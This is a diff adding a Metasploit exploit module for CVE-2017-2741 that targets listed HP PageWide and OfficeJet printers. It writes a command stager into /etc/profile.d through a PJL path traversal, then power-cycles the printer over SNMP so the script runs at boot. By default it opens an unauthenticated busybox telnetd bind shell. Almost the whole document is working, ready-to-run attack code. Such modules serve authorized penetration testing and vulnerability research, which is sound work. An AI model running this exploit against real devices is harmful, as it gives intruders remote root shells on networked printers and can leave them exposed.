@@ -1,0 +1,193 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require "rex/proto/pjl"
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::SNMPClient
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'HP Jetdirect Path Traversal Arbitrary Code Execution',
+      'Description'    => %q{
+        The module exploits a path traversal via Jetdirect to gain arbitrary code execution by
+        writing a shell script that is loaded on startup to /etc/profile.d. Then, the printer
+        is restarted using SNMP. Impacted printers:
+        HP PageWide Managed MFP P57750dw
+        HP PageWide Managed P55250dw
+        HP PageWide Pro MFP 577z
+        HP PageWide Pro 552dw
+        HP PageWide Pro MFP 577dw
+        HP PageWide Pro MFP 477dw
+        HP PageWide Pro 452dw
+        HP PageWide Pro MFP 477dn
+        HP PageWide Pro 452dn
+        HP PageWide MFP 377dw
+        HP PageWide 352dw
+        HP OfficeJet Pro 8730 All-in-One Printer
+        HP OfficeJet Pro 8740 All-in-One Printer
+        HP OfficeJet Pro 8210 Printer
+        HP OfficeJet Pro 8216 Printer
+        HP OfficeJet Pro 8218 Printer
+
+        Please read the module documentation regarding the possibility for leaving an
+        unauthenticated telnetd service running as a side effect of this exploit.
+      },
+      'Author'         => [
+        'Jacob Baines', # Python PoC
+        'Matthew Kienow <matthew_kienow[AT]rapid7.com>', # Metasploit module
+       ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2017-2741' ],
+          [ 'URL', 'https://support.hp.com/lt-en/document/c05462914' ],
+          [ 'URL', 'http://tenable.com/blog/rooting-a-printer-from-security-bulletin-to-remote-code-execution' ]
+        ],
+      'Targets'        => [
+        ['Unix (In-Memory)',
+          'Platform'   => 'unix',
+          'Arch'       => ARCH_CMD,
+          'Payload'    => {
+            'Compat' => {
+              'PayloadType' => 'cmd'
+            }
+          },
+        ]
+      ],
+      'Privileged'     => true,
+      'DisclosureDate' => 'Apr 05 2017',
+      'DefaultTarget'  => 0,
+      'DefaultOptions' => {
+        'PAYLOAD'  => 'cmd/unix/bind_busybox_telnetd',
+        'WfsDelay' => 180
+      }
+    ))
+
+    register_options(
+      [
+        Opt::RPORT(Rex::Proto::PJL::DEFAULT_PORT),
+        OptPort.new('SNMPPORT', [true, 'The SNMP port', 161])
+      ]
+    )
+  end
+
+  def execute_command(cmd, opts = {})
+    rpath = '0:/../../rw/var/etc/profile.d/'
+    stager_script_name = opts[:stager_script_name]
+    cmd = "(cd / && #{cmd}); rm -f /etc/profile.d/#{stager_script_name}"
+
+    begin
+      # use PJL to write command stager
+      print_status("Connecting to port #{rport}...")
+
+      pjl = Rex::Proto::PJL::Client.new(sock)
+      pjl.begin_job
+
+      pjl.fsinit(rpath[0..1])
+
+      print_status("Attempting to write command stager...")
+      rpath = "#{rpath}#{stager_script_name}"
+      if pjl.fsdownload(cmd, rpath, is_file: false)
+        print_good("Successfully wrote command stager to #{rpath}")
+      else
+        print_error("Failed to write command stager to #{rpath}")
+        return
+      end
+
+      # verify command stager exists
+      unless pjl.fsquery(rpath)
+        print_error("Command stager does not exist at #{rpath}; aborting...")
+        return
+      end
+
+      pjl.end_job
+
+    rescue Rex::ConnectionError
+      print_error("Connection Refused")
+      raise
+    end
+  end
+
+  def restart_printer
+    pjl_port = datastore['RPORT']
+    snmp_port = datastore['SNMPPORT']
+    community = datastore['COMMUNITY']
+    # Printer MIB prtGeneralReset object identifier (numeric notation)
+    prt_general_reset = '1.3.6.1.2.1.43.5.1.1.3.1'
+    # prtGeneralReset powerCycleReset(4) value
+    power_cycle_reset = 4
+
+    begin
+      # TODO: Update when there is a clean approach to using two or more mixins that both use RPORT.
+      datastore['RPORT'] = snmp_port
+      print_status("Connecting to SNMP port #{rport}...")
+      snmp = connect_snmp
+
+      # get value of Printer MIB prtGeneralReset
+      reset_value = snmp.get_value(prt_general_reset)
+      reset_value = "''" if reset_value.is_a?(SNMP::Null)
+      print_status("Initial value of prtGeneralReset OID #{prt_general_reset} => #{reset_value}")
+
+      # set value of Printer MIB prtGeneralReset to powerCycleReset(4)
+      print_status("Attempting to restart printer via SNMP...")
+      varbind = SNMP::VarBind.new(prt_general_reset, SNMP::Integer.new(power_cycle_reset))
+      response = snmp.set(varbind)
+
+      if response.error_status == :noError
+        print_status("Set prtGeneralReset OID #{prt_general_reset} => #{power_cycle_reset}")
+
+        # get value of Printer MIB prtGeneralReset
+        reset_value = snmp.get_value(prt_general_reset)
+        reset_value = "''" if reset_value.is_a?(SNMP::Null)
+        print_status("Current value of prtGeneralReset OID #{prt_general_reset} => #{reset_value}")
+        print_status("Printer restarting...")
+
+      else
+        print_error("Unable to set prtGeneralReset; SNMP response error status: #{response.error_status}")
+      end
+
+    rescue SNMP::RequestTimeout
+      print_error("SNMP request timeout with community '#{community}'")
+      raise
+    rescue SNMP::UnsupportedVersion
+      print_error("Unsupported SNMP version specified; use '1' or '2c'")
+      raise
+    rescue Rex::ConnectionError
+      print_error("Connection Refused")
+      raise
+    ensure
+      # restore original rport value
+      datastore['RPORT'] = pjl_port
+    end
+  end
+
+  def exploit
+    begin
+      opts = {
+        stager_script_name: "#{Rex::Text.rand_text_alpha(8)}.sh"
+      }
+
+      print_status("Exploiting...")
+      connect
+      if target.name =~ /Unix/
+        execute_command(payload.encoded, opts)
+      else
+        execute_cmdstager(opts)
+      end
+      restart_printer
+
+      return
+    ensure
+      disconnect
+    end
+  end
+
+end
